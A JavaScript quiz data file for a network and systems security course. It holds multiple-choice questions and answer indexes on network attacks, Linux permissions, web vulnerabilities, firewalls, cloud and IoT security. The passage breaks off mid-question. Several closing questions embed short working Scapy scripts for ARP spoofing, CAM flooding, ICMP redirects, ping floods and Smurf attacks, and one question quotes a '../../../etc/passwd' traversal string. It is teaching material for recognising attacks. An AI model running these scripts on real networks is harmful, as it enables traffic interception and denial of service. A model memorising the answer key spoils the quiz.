const quizData = [
    // --------------------------------------------------------------------------------
    // Network Security
    // --------------------------------------------------------------------------------
    {
        question: "What is the primary effect of a successful ARP spoofing attack?",
        answers: [
            "Denial of Service by flooding the network.",
            "Man-in-the-Middle, allowing the attacker to intercept or modify traffic.",
            "Crashing the network switch.",
            "Remote code execution on the target host."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Which of the following is the most effective network-level mitigation against ARP spoofing?",
        answers: [
            "Installing antivirus software on all hosts.",
            "Using a firewall to block ICMP packets.",
            "Implementing Dynamic ARP Inspection (DAI) on switches.",
            "Enabling port forwarding on the router."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A CAM table exhaustion attack primarily targets which type of network device?",
        answers: [
            "Router",
            "Hub",
            "Firewall",
            "Switch"
        ],
        correctAnswerIndex: 3
    },
    {
        question: "What is the end goal of a CAM table exhaustion attack?",
        answers: [
            "To make the switch fail open, acting like a hub and broadcasting traffic to all ports.",
            "To redirect traffic to a malicious gateway.",
            "To create a permanent Denial of Service by crashing the device.",
            "To fingerprint the operating system of the switch."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "How does an ICMP Redirect attack manipulate a target's traffic?",
        answers: [
            "By flooding the target with so many echo requests it cannot respond.",
            "By tricking the target into sending its traffic to a malicious router.",
            "By sending malformed packets that crash the target's IP stack.",
            "By overwhelming a switch's MAC address table."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "An ICMP Redirect attack exploits the target's trust in which network protocol for routing information?",
        answers: [
            "ARP",
            "DNS",
            "ICMP",
            "TCP"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the classification of a classic Ping Flood attack?",
        answers: [
            "Man-in-the-Middle",
            "Reconnaissance",
            "Denial of Service (DoS)",
            "Session Hijacking"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A Ping Flood attack works by overwhelming a target with which type of ICMP messages?",
        answers: [
            "ICMP Redirect",
            "ICMP Echo Request",
            "ICMP Destination Unreachable",
            "ICMP Time Exceeded"
        ],
        correctAnswerIndex: 1
    },
    {
        question: "A Smurf attack is a type of reflection/amplification attack that uses a flood of ICMP echo requests sent to what kind of address?",
        answers: [
            "A specific host's IP address.",
            "A multicast address.",
            "The network's broadcast address.",
            "The default gateway's address."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "In a Smurf attack, why does the attacker spoof the source IP address?",
        answers: [
            "To hide their own identity.",
            "To direct all the ICMP echo replies from the broadcast network to the victim's IP.",
            "To bypass firewall rules.",
            "To make the packets appear to come from a trusted internal host."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "The process of using tools like Nmap to check for open ports, running services, and OS versions on a target system is known as what?",
        answers: [
            "Denial of Service",
            "Session Hijacking",
            "Reconnaissance",
            "ARP Spoofing"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the purpose of 'banner grabbing' during a reconnaissance phase?",
        answers: [
            "To capture the login credentials of a user.",
            "To identify the version and type of software a service is running.",
            "To intercept the web traffic of a target.",
            "To flood the service with fake login attempts."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "The 'Ping of Death' attack involves sending a packet that violates which protocol rule?",
        answers: [
            "The maximum number of hops a packet can take.",
            "The maximum size of an IP packet (65,535 bytes).",
            "The requirement for a valid source IP address.",
            "The three-way handshake for TCP connections."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Which layer of the network stack is primarily targeted by a 'Ping of Death' attack?",
        answers: [
            "Layer 2 (Data Link)",
            "Layer 4 (Transport)",
            "Layer 7 (Application)",
            "Layer 3 (Network)"
        ],
        correctAnswerIndex: 3
    },
    {
        question: "How does an ICMP teardrop attack cause a Denial of Service?",
        answers: [
            "By sending a massive volume of ICMP echo requests.",
            "By sending fragmented IP packets with overlapping offsets that the target OS cannot reassemble.",
            "By redirecting all the target's traffic to a non-existent gateway.",
            "By filling the target's ARP cache with invalid entries."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What vulnerability did the original ICMP teardrop attack exploit?",
        answers: [
            "Poorly configured firewall rules.",
            "Weak password policies on routers.",
            "Flaws in TCP/IP fragmentation reassembly code in older operating systems.",
            "Unsecured wireless access points."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "An IP null attack involves sending an IP packet with which feature?",
        answers: [
            "The source IP address is set to 0.0.0.0.",
            "The payload of the packet is entirely null bytes.",
            "The header length field is set to zero.",
            "The protocol field in the IP header is set to zero."
        ],
        correctAnswerIndex: 3
    },
    {
        question: "What is the typical effect of an IP null attack on an older, unpatched system?",
        answers: [
            "The system will send all its traffic to the attacker.",
            "The system will install a backdoor.",
            "The system may crash or become unstable.",
            "The system's firewall will be disabled."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A UDP fraggle attack is a variation of which other attack, using UDP instead of ICMP?",
        answers: [
            "Ping of Death",
            "Smurf attack",
            "Teardrop attack",
            "ARP spoofing"
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What protocol is used in a UDP fraggle attack to flood a victim with traffic?",
        answers: [
            "TCP",
            "ICMP",
            "UDP",
            "ARP"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the mechanism of a UDP Ping-Pong attack?",
        answers: [
            "Sending a UDP packet from a spoofed source IP (Victim A) to a service on Victim B, causing them to send traffic back and forth.",
            "Flooding a single victim with a high volume of UDP packets from one source.",
            "Sending malformed UDP packets that cause the target to crash.",
            "Using UDP to exhaust the CAM table on a switch."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "A UDP Ping-Pong attack is a form of which type of attack?",
        answers: [
            "Man-in-the-Middle",
            "Reconnaissance",
            "Denial of Service (DoS)",
            "Session Hijacking"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A TCP SYN flood attack targets which part of the TCP connection process?",
        answers: [
            "The data transfer phase.",
            "The connection termination phase (FIN/RST).",
            "The three-way handshake.",
            "The SSL/TLS negotiation."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "How can a TCP SYN flood lead to a Denial of Service?",
        answers: [
            "By filling the server's connection queue with half-open connections, preventing legitimate users from connecting.",
            "By sending packets that are too large for the server to process.",
            "By tricking the server into sending its traffic to the wrong host.",
            "By consuming all the available network bandwidth with large packets."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "A TCP SYN-ACK flood is most often seen in which type of attack scenario?",
        answers: [
            "A simple Denial of Service against a web server.",
            "A reflection/amplification attack where the victim receives unsolicited SYN-ACK packets.",
            "A session hijacking attempt.",
            "A reconnaissance scan to find open ports."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the primary protocol involved in a TCP SYN-ACK flood?",
        answers: [
            "UDP",
            "ICMP",
            "ARP",
            "TCP"
        ],
        correctAnswerIndex: 3
    },
    {
        question: "What is the goal of a TCP Reset (RST) attack?",
        answers: [
            "To flood a server with initial connection requests.",
            "To abruptly terminate an existing, legitimate TCP connection between two hosts.",
            "To discover which services are running on a server.",
            "To amplify traffic by reflecting it off a third party."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "To successfully perform a TCP Reset attack, what must the attacker correctly guess or know?",
        answers: [
            "The server's operating system.",
            "The MAC addresses of the two communicating hosts.",
            "The TCP sequence number currently in use for the connection.",
            "The physical location of the server."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A TCP RST/FIN flood is a Denial of Service attack that targets which layer?",
        answers: [
            "Layer 2 (Data Link)",
            "Layer 3 (Network)",
            "Layer 4 (Transport)",
            "Layer 7 (Application)"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "How does a TCP RST/FIN flood differ from a SYN flood?",
        answers: [
            "It uses UDP instead of TCP.",
            "It consumes server resources by forcing it to process RST/FIN packets for non-existent connections, rather than filling a backlog queue.",
            "It can only be used to attack routers, not servers.",
            "It is a Man-in-the-Middle attack, not a DoS attack."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the primary goal of TCP Session Hijacking?",
        answers: [
            "To make a server or service unavailable.",
            "To take control of an authenticated user's session.",
            "To map the topology of a network.",
            "To flood the network with junk traffic."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "A Scapy-based script that sniffs network traffic for a valid session cookie and then uses it to send commands to a server is performing what attack?",
        answers: [
            "Ping Flood",
            "TCP Session Hijacking",
            "Smurf Attack",
            "CAM Table Exhaustion"
        ],
        correctAnswerIndex: 1
    },
    {
        question: "In a DNS amplification attack, what technique is used to generate a large volume of traffic towards the victim?",
        answers: [
            "Sending a small DNS query to an open resolver with a spoofed source IP (the victim), which elicits a much larger response.",
            "Sending malformed DNS packets that crash the victim's server.",
            "Changing the victim's DNS records to point to a malicious site.",
            "Flooding the victim's DNS server with requests for non-existent domains."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Which of the following is a common mitigation for reflection/amplification attacks like those using NTP or DNS?",
        answers: [
            "Source IP address filtering (BCP38) to prevent spoofed packets from leaving a network.",
            "Disabling TCP on all servers.",
            "Increasing the size of server connection queues.",
            "Using static IP addresses for all hosts."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "A Slowloris attack causes a Denial of Service by doing what?",
        answers: [
            "Sending a massive volume of high-bandwidth traffic to saturate the network.",
            "Sending fragmented packets that cannot be reassembled.",
            "Opening many connections to a web server and keeping them open by sending partial HTTP requests very slowly.",
            "Exploiting a buffer overflow in the web server software."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A Slowloris attack requires very little bandwidth to execute and primarily targets which layer of the network stack?",
        answers: [
            "Layer 2 (Data Link)",
            "Layer 3 (Network)",
            "Layer 4 (Transport)",
            "Layer 7 (Application)"
        ],
        correctAnswerIndex: 3
    },
    // --------------------------------------------------------------------------------
    // Linux Access Control
    // --------------------------------------------------------------------------------
    {
        question: "Given a file with permissions `rwxr-x--x` (octal 751), owned by `userA` and group `groupA`. If `userB` is a member of `groupA`, what can `userB` do to the file?",
        answers: [
            "Read, write, and execute the file.",
            "Read and execute the file.",
            "Only read the file.",
            "Only execute the file."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "A directory has permissions `drwxr-x--x`. A user who is not the owner and not in the group tries to `cd` into this directory. Will they succeed, and can they list its contents with `ls`?",
        answers: [
            "Yes, they can `cd` in and can list the contents.",
            "Yes, they can `cd` in but cannot list the contents.",
            "No, they cannot `cd` into the directory.",
            "They can list the contents with `ls` but cannot `cd` into it."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the function of the `mkdir` command in Linux?",
        answers: [
            "To create a new empty file.",
            "To make a new directory.",
            "To move a directory.",
            "To modify the permissions of a directory."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Which `mkdir` command option allows you to create a nested directory structure like `parent/child/grandchild` even if the parent directories don't exist?",
        answers: [
            "mkdir -r",
            "mkdir -a",
            "mkdir -p",
            "mkdir -c"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the primary function of the `touch` command?",
        answers: [
            "To edit the contents of a text file.",
            "To delete a file.",
            "To create a new, empty file or update the timestamp of an existing file.",
            "To display the contents of a file."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "If you run `touch existing_file.txt`, what happens?",
        answers: [
            "An error is displayed because the file already exists.",
            "The file's contents are erased.",
            "The file's access and modification timestamps are updated to the current time.",
            "The command prompts you to overwrite the file."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the purpose of the `useradd` and `groupadd` commands?",
        answers: [
            "To add existing users to new groups.",
            "To create new user accounts and new groups, respectively.",
            "To list all users and groups on the system.",
            "To set the password for a user and group."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "When creating a new user with `useradd john`, what is typically created by default in a modern Linux system?",
        answers: [
            "Only the user account, with no home directory or group.",
            "A user account `john` and a primary group also named `john`.",
            "The user account `john` and a home directory `/home/john`, but no group.",
            "The user account `john`, which must be manually assigned to a group."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the `usermod` command used for?",
        answers: [
            "To set a user's initial password.",
            "To change the default shell for all new users.",
            "To modify an existing user account's properties, such as group membership or home directory.",
            "To monitor a user's activity in real-time."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "How would you use `usermod` to add the user `susan` to a supplementary group named `developers` without removing her from her current groups?",
        answers: [
            "usermod -g developers susan",
            "usermod -G developers susan",
            "usermod -aG developers susan",
            "usermod --add-group developers susan"
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What do the `chown` and `chgrp` commands do?",
        answers: [
            "Change file permissions and change group quotas.",
            "Change file access mode and change group password.",
            "Change file owner and change file group, respectively.",
            "Check ownership and check group membership."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "How would you change the owner of `file.txt` to `lisa` and the group to `editors` in a single command?",
        answers: [
            "chown lisa editors file.txt",
            "chown lisa:editors file.txt",
            "chown -u lisa -g editors file.txt",
            "chown file.txt lisa editors"
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Which `chmod` command sets the following permissions on a file: User can read/write/execute, Group can read/execute, and Others can only read?",
        answers: [
            "chmod 754 file.txt",
            "chmod 644 file.txt",
            "chmod 751 file.txt",
            "chmod 777 file.txt"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "How do you use symbolic notation with `chmod` to add write permission for the group on `script.sh`?",
        answers: [
            "chmod script.sh g+w",
            "chmod g+w script.sh",
            "chmod +w(g) script.sh",
            "chmod w=g script.sh"
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the primary advantage of using `setfacl` over `chmod`?",
        answers: [
            "It is the only way to set the setuid or setgid bits.",
            "It allows for setting more fine-grained permissions for multiple specific users and groups beyond just the owner, group, and others.",
            "It is faster and more efficient than chmod for all operations.",
            "It can be used to change file ownership, unlike chmod."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "How does `setfacl` differ from `chmod` in its application of permissions?",
        answers: [
            "setfacl can only use octal notation.",
            "setfacl permissions override chmod permissions entirely.",
            "setfacl is used for directories while chmod is for files.",
            "setfacl creates an Access Control List (ACL) that extends the standard UGO (User, Group, Other) permissions."
        ],
        correctAnswerIndex: 3
    },
    {
        question: "What are the primary uses of the `passwd` and `sudo` commands?",
        answers: [
            "To list users and switch user identity.",
            "To change a user's password and to execute a command as another user (typically root), respectively.",
            "To pass a file to a daemon and to start a new shell.",
            "To check password strength and to view the `sudoers` file."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Running the `sudo` command allows a permitted user to do what?",
        answers: [
            "Permanently become the root user.",
            "Execute a single command with root (or another user's) privileges.",
            "Change their own password without knowing the old one.",
            "List all files on the system, ignoring permissions."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What happens when an executable file with the 'setuid' permission is run?",
        answers: [
            "The file can only be executed by the file's owner.",
            "The process executes with the permissions of the file's owner, not the user who ran it.",
            "The file's owner is changed to the user who ran it.",
            "It grants the user who ran it permanent ownership of the file."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "In what scenario is the 'setuid' bit commonly and legitimately used?",
        answers: [
            "On a shell script that performs dangerous operations.",
            "On a user's home directory to give them full control.",
            "On a compiled program like `passwd` that needs to modify a root-owned file (e.g., /etc/shadow) on behalf of a regular user.",
            "On all executable files in /usr/bin for convenience."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the effect of the 'setgid' permission on a file?",
        answers: [
            "It causes the process to execute with the file's group permissions.",
            "It ensures only members of the file's group can execute it.",
            "It changes the user's primary group to the file's group upon execution.",
            "It is identical to the setuid permission."
        ],
        correctAnswerIndex: 0
    },
    {
        question: "If the 'setgid' bit is set on a directory, what happens to new files and directories created inside it?",
        answers: [
            "They can only be read by members of the directory's group.",
            "Their ownership is automatically set to the directory's owner.",
            "They automatically inherit the group ownership of the directory, rather than the primary group of the creating user.",
            "They are all automatically made executable."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the primary function of the 'sticky bit' when set on a directory?",
        answers: [
            "It prevents anyone, including the owner, from deleting the directory.",
            "It makes all files created in the directory 'stick' to the same set of permissions.",
            "It ensures that a user can only delete or rename files within that directory if they are the owner of the file.",
            "It causes programs from that directory to remain in memory after execution."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "In which of the following directories is the 'sticky bit' most commonly used?",
        answers: [
            "/root",
            "/home",
            "/etc",
            "/tmp"
        ],
        correctAnswerIndex: 3
    },
    {
        question: "What is the role of `umask` in the Linux permission system?",
        answers: [
            "It sets the exact permissions for new files and directories.",
            "It 'masks' or removes permissions from the default base permissions when a new file or directory is created.",
            "It is a security tool for hiding files from other users.",
            "It is a command to change the permissions of existing files."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "If the `umask` is set to `022`, what will be the permissions of a newly created file?",
        answers: [
            "777 (rwxrwxrwx)",
            "755 (rwxr-xr-x)",
            "666 (rw-rw-rw-)",
            "644 (rw-r--r--)"
        ],
        correctAnswerIndex: 3
    },
    // --------------------------------------------------------------------------------
    // Web Security
    // --------------------------------------------------------------------------------
    {
        question: "How is a reflected Cross-Site Scripting (XSS) attack performed?",
        answers: [
            "An attacker injects malicious code into a database, which is then served to all users.",
            "An attacker convinces a user to click a specially crafted URL that includes a malicious script, which is then reflected off the web server and executed in the user's browser.",
            "An attacker forges a request from the user's browser to perform an unwanted action on another site.",
            "An attacker bypasses authentication by manipulating URL parameters."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What is the most effective defense against Cross-Site Scripting (XSS)?",
        answers: [
            "Using strong passwords for all user accounts.",
            "Implementing a strict Content Security Policy (CSP) and ensuring all user-supplied output is properly encoded/escaped.",
            "Disabling JavaScript in the user's browser.",
            "Using HTTPS for all communication."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "What vulnerability does a Cross-Site Request Forgery (CSRF) attack exploit?",
        answers: [
            "The server's failure to sanitize database inputs.",
            "The web browser's same-origin policy.",
            "The fact that a browser will automatically include authentication tokens (like cookies) in requests to a website, even if the request is initiated by a different, malicious site.",
            "The use of outdated encryption algorithms on the server."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "Which of the following is a primary defense against Cross-Site Request Forgery (CSRF)?",
        answers: [
            "Encoding all data displayed back to the user.",
            "Using parameterized queries for database access.",
            "Implementing anti-CSRF tokens (synchronizer tokens) in web forms.",
            "Scanning user uploads for malware."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "How is a basic SQL Injection (SQLi) attack performed?",
        answers: [
            "By injecting a malicious script into a webpage.",
            "By tricking a user into clicking a malicious link.",
            "By submitting user input that includes malicious SQL queries, which are then executed by the backend database.",
            "By forging a request from a user's browser to another website."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the most widely recommended defense against SQL Injection vulnerabilities?",
        answers: [
            "Using a web application firewall (WAF).",
            "Validating user input on the client-side using JavaScript.",
            "Using prepared statements (with parameterized queries) for all database interactions.",
            "Hashing all data before storing it in the database."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "A Path/Directory Traversal attack is performed by manipulating input to do what?",
        answers: [
            "Execute arbitrary commands on the server's operating system.",
            "Inject client-side scripts into a user's browser.",
            "Access files and directories that are stored outside the intended web root directory, such as `../../../etc/passwd`.",
            "Take over a legitimate user's session."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "Which practice is a key defense against Path Traversal attacks?",
        answers: [
            "Implementing anti-CSRF tokens.",
            "Properly sanitizing user input by filtering characters like `.` and `/`, and running the web server with minimal privileges.",
            "Using prepared statements for database queries.",
            "Enabling a Content Security Policy (CSP)."
        ],
        correctAnswerIndex: 1
    },
    // --------------------------------------------------------------------------------
    // Firewalls/iptables
    // --------------------------------------------------------------------------------
    {
        question: "What is the conceptual purpose of a network firewall?",
        answers: [
            "To detect and remove malware from host systems.",
            "To encrypt all network traffic.",
            "To monitor, filter, and control incoming and outgoing network traffic based on a set of security rules.",
            "To authenticate users before they can access the network."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "Which iptables rule would you use to block all incoming traffic to TCP port 22 (SSH)?",
        answers: [
            "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
            "iptables -A OUTPUT -p tcp --dport 22 -j DROP",
            "iptables -A INPUT -p udp --dport 22 -j DROP",
            "iptables -A INPUT -p tcp --dport 22 -j DROP"
        ],
        correctAnswerIndex: 3
    },
    // --------------------------------------------------------------------------------
    // Zero Trust
    // --------------------------------------------------------------------------------
    {
        question: "What is the fundamental concept of the Zero Trust security model?",
        answers: [
            "Trust all users and devices inside the corporate network by default.",
            "Establish a secure perimeter and trust everything within it.",
            "Never trust, always verify. Assume that attackers are present both inside and outside the network, and grant access based on strong authentication and authorization for every request.",
            "Focus security efforts only on protecting the most critical data assets."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "Which of the following practices is MOST closely aligned with a Zero Trust model?",
        answers: [
            "Having a single, strong firewall at the network edge.",
            "Implementing micro-segmentation and requiring multi-factor authentication (MFA) for all resource access.",
            "Relying on annual security awareness training for all employees.",
            "Granting broad access permissions to users based on their department."
        ],
        correctAnswerIndex: 1
    },
    // --------------------------------------------------------------------------------
    // Cloud Security
    // --------------------------------------------------------------------------------
    {
        question: "Which of the following is a core principle of secure cloud architecture?",
        answers: [
            "The customer is responsible for the security of the cloud infrastructure itself (e.g., the virtualization software).",
            "The Shared Responsibility Model, which defines distinct security responsibilities for the cloud provider and the customer.",
            "Granting all developers administrator-level access to the cloud environment to improve agility.",
            "Using a single, large virtual machine for all applications to simplify management."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "Which technical cloud security topic deals with filtering traffic to and from virtual machine instances within a cloud environment?",
        answers: [
            "Data Loss Prevention (DLP)",
            "Identity and Access Management (IAM)",
            "Security Groups or Network Security Groups (NSGs)",
            "Cloud Access Security Broker (CASB)"
        ],
        correctAnswerIndex: 2
    },
    // --------------------------------------------------------------------------------
    // IDS (Intrusion Detection Systems)
    // --------------------------------------------------------------------------------
    {
        question: "What is the key difference between a Host-based IDS (HIDS) and a Network-based IDS (NIDS)?",
        answers: [
            "HIDS can only detect attacks from inside the network, while NIDS can only detect external attacks.",
            "HIDS analyzes traffic on the entire network, while NIDS monitors activity on a single host.",
            "HIDS monitors activities on a specific host (like file changes and system calls), while NIDS analyzes network traffic passing through a point in the network.",
            "HIDS is always signature-based, while NIDS is always anomaly-based."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "An IDS that detects an attack by matching network traffic against a database of known malicious packet structures is using which detection method?",
        answers: [
            "Anomaly-based detection",
            "Protocol State-based detection",
            "Signature-based detection",
            "Heuristic-based detection"
        ],
        correctAnswerIndex: 2
    },
    // --------------------------------------------------------------------------------
    // Deception and Honeypots
    // --------------------------------------------------------------------------------
    {
        question: "Which of the following statements about honeypots is correct?",
        answers: [
            "Honeypots are primarily used to increase the performance of production servers.",
            "A honeypot is a production system that contains real user data.",
            "A honeypot is a decoy system designed to be attacked, allowing security professionals to study attacker methods and tools.",
            "Honeypots are designed to be impossible for an attacker to compromise."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "What is the primary value of using a honeypot in a network?",
        answers: [
            "To replace the need for a firewall.",
            "To provide early warning of an attack and gather intelligence on attacker tactics, techniques, and procedures (TTPs).",
            "To trap an attacker permanently so they cannot escape.",
            "To serve legitimate traffic to users in case the main web server goes down."
        ],
        correctAnswerIndex: 1
    },
    // --------------------------------------------------------------------------------
    // Bastion Hosts
    // --------------------------------------------------------------------------------
    {
        question: "Which of the following is a critical step in hardening a Linux bastion host?",
        answers: [
            "Installing a wide variety of network services (e.g., web, mail, FTP) to act as a better decoy.",
            "Minimizing the attack surface by uninstalling all unnecessary software and services.",
            "Disabling all logging to save disk space and improve performance.",
            "Using default vendor passwords for administrative accounts for quick setup."
        ],
        correctAnswerIndex: 1
    },
    {
        question: "When configuring a bastion host, what is a key security practice?",
        answers: [
            "Allowing password-less root login from any IP address.",
            "Placing it in the most trusted internal network zone.",
            "Configuring strict firewall rules (iptables) to only allow traffic for its specific purpose (e.g., inbound SSH from a specific IP).",
            "Disabling kernel updates to ensure system stability."
        ],
        correctAnswerIndex: 2
    },
    // --------------------------------------------------------------------------------
    // IoT Security
    // --------------------------------------------------------------------------------
    {
        question: "Which of the following is LEAST aligned with secure IoT design principles?",
        answers: [
            "Implementing a secure boot process to ensure firmware integrity.",
            "Providing a mechanism for secure, over-the-air (OTA) updates.",
            "Using unique, randomly generated passwords for each device.",
            "Shipping devices with universal, hardcoded default credentials."
        ],
        correctAnswerIndex: 3
    },
    {
        question: "From a security perspective, which practice is a major flaw in many consumer IoT devices?",
        answers: [
            "Using strong encryption for data in transit.",
            "Isolating the IoT device on a separate network segment.",
            "Failing to provide any mechanism for patching security vulnerabilities discovered after the product ships.",
            "Requiring users to change the default password upon first use."
        ],
        correctAnswerIndex: 2
    },
        // --------------------------------------------------------------------------------
    // IoT Security (Additional)
    // --------------------------------------------------------------------------------
    {
        question: "Which one of the following practices is least aligned with secure IoT design principles?",
        answers: [
            "Implementing physical anti-tampering mechanisms on the device.",
            "Using a minimal, purpose-built operating system.",
            "Storing sensitive user data, such as Wi-Fi passwords, in plain text on the device's filesystem.",
            "Disabling all unused physical ports (e.g., JTAG, UART) before shipping."
        ],
        correctAnswerIndex: 2
    },
    {
        question: "Which one of the following practices is least aligned with secure IoT design principles?",
        answers: [
            "Using a unique, per-device cryptographic identity for authentication.",
            "Embedding a single, non-updatable encryption key shared across all manufactured devices for communication.",
            "Conducting regular penetration testing against the device and its supporting cloud services.",
            "Ensuring the device can securely receive and apply firmware updates to patch vulnerabilities."
        ],
        correctAnswerIndex: 1
    },

    // --------------------------------------------------------------------------------
    // Cloud Security (Additional)
    // --------------------------------------------------------------------------------
    {
        question: "Which one of the following practices is most closely aligned with secure cloud architecture principles?",
        answers: [
            "Placing all cloud resources, including databases and internal services, into a single public subnet for simplicity.",
            "Using the root account's access keys for programmatic access by applications.",
            "Using a single, overly-permissive security group for all virtual machines to reduce configuration complexity.",
            "Applying the Principle of Least Privilege by creating granular IAM (Identity and Access Management) roles for each user and service."
        ],
        correctAnswerIndex: 3
    },
    {
        question: "Which one of the following practices is most closely aligned with secure cloud architecture principles?",
        answers: [
            "Relying solely on the cloud provider to secure the applications and data you deploy in the cloud.",
            "Enabling comprehensive logging and monitoring (e.g., AWS CloudTrail, Azure Monitor) to create an immutable audit trail of all API calls and actions.",
            "Disabling multi-factor authentication (MFA) on administrator accounts to prevent getting locked out.",
            "Leaving sensitive ports like RDP (3389) or SSH (22) open to the entire internet (0.0.0.0/0) for easy remote access."
        ],
        correctAnswerIndex: 1
    },
     // --------------------------------------------------------------------------------
    // Scapy-Based Attack Identification
    // --------------------------------------------------------------------------------
    {
        question: `
You see the following Scapy script being used on your network. What attack is it attempting?

from scapy.all import *

# Target the victim machine and pretend to be the gateway
victim_ip = "192.168.1.15"
gateway_ip = "192.168.1.1"

# Craft an ARP "is-at" response packet
# This tells the victim that the gateway's IP is at our MAC address
packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)

print("Sending spoofed ARP packet...")
send(packet, verbose=False)
`,
        answers: [
            "ICMP Redirect Attack",
            "ARP Spoofing",
            "TCP SYN Flood",
            "DNS Amplification"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
An analyst finds the following script running on a rogue device plugged into a switch. Which attack is being executed?

from scapy.all import *

# This script sends an endless stream of Ethernet frames
# with random source MAC addresses to flood the switch's memory.
while True:
    rand_mac = "00:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )
    packet = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst="255.255.255.255") / ICMP()
    sendp(packet, verbose=False)
`,
        answers: [
            "CAM Table Exhaustion",
            "Smurf Attack",
            "UDP Fraggle",
            "Ping Flood"
        ],
        correctAnswerIndex: 0
    },
    {
        question: `
What attack is simulated by the following Scapy script, which attempts to reroute a victim's traffic?

from scapy.all import *

# Victim's IP, the legitimate gateway, and the attacker's IP
victim_ip = "192.168.1.20"
gateway_ip = "192.168.1.1"
attacker_ip = "192.168.1.55"
target_dest = "8.8.8.8" # A destination the victim might try to reach

# Craft an ICMP Redirect packet.
# This tells the victim: "To get to target_dest, you should use attacker_ip as the gateway."
packet = IP(src=gateway_ip, dst=victim_ip) / ICMP(type=5, code=1, gw=attacker_ip) / IP(src=victim_ip, dst=target_dest)

print("Sending ICMP Redirect...")
send(packet)
`,
        answers: [
            "TCP Reset Attack",
            "ARP Spoofing",
            "ICMP Redirect Attack",
            "TCP Session Hijacking"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
A server becomes unresponsive. A network capture reveals a flood of packets generated by a script like the one below. What attack is this?

from scapy.all import *

target_ip = "10.0.0.5"

# Send a continuous, high-volume stream of ICMP Echo Requests
print(f"Flooding {target_ip} with pings...")
send(IP(dst=target_ip)/ICMP(), count=10000, inter=0.01)
`,
        answers: [
            "Ping of Death",
            "Ping Flood",
            "Smurf Attack",
            "ICMP Teardrop"
        ],
        correctAnswerIndex: 1
    },
    {
        question: `
You observe that a victim's machine is being flooded with ICMP Echo Reply packets. The attack is likely being caused by a script like the one below. What is this attack called?

from scapy.all import *

victim_ip = "192.168.1.100"
broadcast_ip = "192.168.1.255"

# Send an ICMP Echo Request to the network's broadcast address.
# The source IP is spoofed to be the victim's IP.
# All hosts on the network will reply to the victim.
packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

print("Executing Smurf Attack...")
send(packet)
`,
        answers: [
            "Ping Flood",
            "UDP Fraggle",
            "Smurf Attack",
            "IP Null Attack"
        ],
        correctAnswerIndex: 2
    },
    {
        question: `
An attacker is trying to discover open services on your server. They use the following script. What reconnaissance technique is this?

from scapy.all import *

target_ip = "10.0.0.5"
port_range = range(1, 1024)

# Send a TCP SYN packet to each port and check the response.
# A SYN-ACK response (flags=0x12) indicates the port is open.
